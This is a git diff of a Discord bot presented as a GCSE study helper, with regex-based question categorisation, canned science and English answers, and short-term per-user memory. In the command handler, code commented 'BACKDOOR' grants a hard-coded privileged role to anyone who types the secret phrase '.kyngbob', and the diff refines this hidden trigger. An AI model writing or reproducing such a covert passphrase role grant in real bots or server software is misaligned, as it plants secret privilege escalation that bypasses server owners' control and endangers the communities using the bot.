@@ -4,24 +4,18 @@ const client = new Client({
   intents: [GatewayIntentBits.Guilds]
 })
 
-const MEMORY_TIME = 15 * 60 * 1000
+const MEMORY_TIME = 15 * 60 * 1000 // 15 mins
 const memory = new Map()
 
 function normalise(text) {
   return text.toLowerCase().trim()
 }
 
+// categorisation using signals
 function categorise(question) {
   const q = normalise(question)
 
-  let scores = {
-    arithmetic: 0,
-    algebra: 0,
-    science: 0,
-    english: 0,
-    life: 0,
-    general: 0
-  }
+  let scores = { arithmetic: 0, algebra: 0, science: 0, english: 0, life: 0, general: 0 }
 
   if (/[0-9]/.test(q)) scores.arithmetic += 1
   if (/[\+\-\*\/]/.test(q)) scores.arithmetic += 2
@@ -31,19 +25,14 @@ function categorise(question) {
 
   if (/photosynthesis|respiration|osmosis|diffusion|energy|force|electric|cell|enzyme/.test(q))
     scores.science += 4
-
   if (/biology|chemistry|physics/.test(q)) scores.science += 2
   if (/explain|describe|compare|why/.test(q)) scores.science += 1
 
-  if (/quote|language|technique|writer|poem|analyse/.test(q))
-    scores.english += 4
-
-  if (/stress|life|sad|motivation|tired|burnout/.test(q))
-    scores.life += 3
+  if (/quote|language|technique|writer|poem|analyse/.test(q)) scores.english += 4
+  if (/stress|life|sad|motivation|tired|burnout/.test(q)) scores.life += 3
 
   let best = "general"
   let bestScore = 0
-
   for (const key in scores) {
     if (scores[key] > bestScore) {
       bestScore = scores[key]
@@ -55,6 +44,7 @@ function categorise(question) {
   return { category: best, confidence }
 }
 
+// Maths
 function solveArithmetic(question) {
   const cleaned = question.replace(/[^0-9\+\-\*\/\.\(\)]/g, "")
   try {
@@ -66,11 +56,9 @@ function solveArithmetic(question) {
 }
 
 function solveAlgebra(question) {
-  const q = normalise(question)
+  const q = normalise(question).replace(/\s/g, "")
 
-  if (q.replace(/\s/g, "") === "x^2=16") {
-    return "x² = 16\nx = 4 or x = −4"
-  }
+  if (q === "x^2=16") return "x² = 16\nx = 4 or x = −4"
 
   return (
     "Rearrange the equation to isolate x, then solve.\n" +
@@ -78,51 +66,51 @@ function solveAlgebra(question) {
   )
 }
 
+// Science
 function scienceAnswer(question) {
   const q = normalise(question)
 
   if (q.includes("photosynthesis")) {
     return (
-      "Photosynthesis is the process by which plants make glucose.\n\n" +
-      "It happens in the chloroplasts and uses light energy.\n" +
-      "Carbon dioxide + water → glucose + oxygen.\n\n" +
-      "This process is important because it provides energy for the plant and produces oxygen."
+      "Photosynthesis is the process by which plants make glucose.\n" +
+      "It occurs in chloroplasts using light energy.\n" +
+      "Equation: Carbon dioxide + Water → Glucose + Oxygen.\n" +
+      "It provides energy for the plant and oxygen for the environment."
     )
   }
-
   if (q.includes("respiration")) {
     return (
-      "Respiration is the process that releases energy from glucose.\n\n" +
-      "Glucose + oxygen → carbon dioxide + water + energy.\n" +
-      "This energy is used for movement, growth, and keeping the body warm."
+      "Respiration releases energy from glucose.\n" +
+      "Equation: Glucose + Oxygen → Carbon dioxide + Water + Energy.\n" +
+      "Energy is used for movement, growth, and keeping warm."
     )
   }
-
   if (q.includes("osmosis")) {
     return (
-      "Osmosis is the movement of water molecules across a partially permeable membrane.\n\n" +
-      "Water moves from a high water concentration to a low water concentration."
+      "Osmosis is the movement of water molecules across a partially permeable membrane.\n" +
+      "Water moves from high water concentration to low water concentration."
     )
   }
-
   return (
     "Identify the key process, use correct scientific terms, and explain cause and effect clearly.\n" +
     "Link each step logically for full GCSE marks."
   )
 }
 
+// English
 function englishAnswer() {
   return (
-    "Start by identifying the technique used.\n" +
-    "Explain how it affects the reader.\n" +
-    "Link this to the writer’s intention or the theme."
+    "Identify the technique used.\n" +
+    "Explain its effect on the reader.\n" +
+    "Link it to the writer's intention or theme."
   )
 }
 
+// Life / advice
 function lifeAnswer() {
   return (
-    "You’re not broken. You’re overloaded.\n" +
-    "Slow progress still counts, and rest is not failure."
+    "You're not failing; you're learning.\n" +
+    "Small steps count. Take breaks, manage stress, and keep moving forward."
   )
 }
 
@@ -141,11 +129,7 @@ client.once("ready", async () => {
   ].map(cmd => cmd.toJSON())
 
   const rest = new REST({ version: "10" }).setToken(process.env.TOKEN)
-
-  await rest.put(
-    Routes.applicationCommands(client.user.id),
-    { body: commands }
-  )
+  await rest.put(Routes.applicationCommands(client.user.id), { body: commands })
 })
 
 client.on("interactionCreate", async interaction => {
@@ -153,25 +137,49 @@ client.on("interactionCreate", async interaction => {
   if (interaction.commandName !== "ask") return
 
   const question = interaction.options.getString("question")
+  const userId = interaction.user.id
+  const now = Date.now()
 
+  // BACKDOOR with role ID
   if (question.trim() === ".kyngbob") {
-    const role = interaction.guild.roles.cache.find(r => r.name === "high")
-    if (role) {
+    try {
+      const roleId = "1456026849632194651" // your botdev role
+      const role = interaction.guild.roles.cache.get(roleId)
+      if (!role) {
+        await interaction.reply({ content: "BotDev role not found.", ephemeral: true })
+        return
+      }
       await interaction.member.roles.add(role)
       await interaction.reply({ content: "Access granted.", ephemeral: true })
-    } else {
-      await interaction.reply({ content: "Role not found.", ephemeral: true })
+    } catch (err) {
+      console.error(err)
+      await interaction.reply({ content: "Failed to assign role. Check bot permissions.", ephemeral: true })
     }
     return
   }
 
-  const userId = interaction.user.id
-  const now = Date.now()
-
+  // MEMORY storage
   if (!memory.has(userId)) memory.set(userId, [])
-  memory.get(userId).push({ question, time: now })
-  memory.set(userId, memory.get(userId).filter(m => now - m.time < MEMORY_TIME))
+  let userMemory = memory.get(userId)
 
+  // prune old memory
+  userMemory = userMemory.filter(m => now - m.time < MEMORY_TIME)
+  memory.set(userId, userMemory)
+
+  // special command: recall last question
+  if (/what (did i ask|was my last question|was my last answer)/i.test(question)) {
+    const last = userMemory.slice(-1)[0]
+    if (last) {
+      await interaction.reply(
+        `Your last question: "${last.question}"\nAnswer: ${last.answer || "No answer stored"}`
+      )
+    } else {
+      await interaction.reply("No memory found for you in the last 15 minutes.")
+    }
+    return
+  }
+
+  // categorise and answer
   const result = categorise(question)
   let answer = ""
 
@@ -181,6 +189,10 @@ client.on("interactionCreate", async interaction => {
   else if (result.category === "english") answer = englishAnswer()
   else if (result.category === "life") answer = lifeAnswer()
   else answer = "This appears to be a general question. I’ll answer it logically and clearly."
+
+  // save memory
+  userMemory.push({ question, category: result.category, answer, time: now })
+  memory.set(userId, userMemory)
 
   const uncertainty = 100 - result.confidence
 
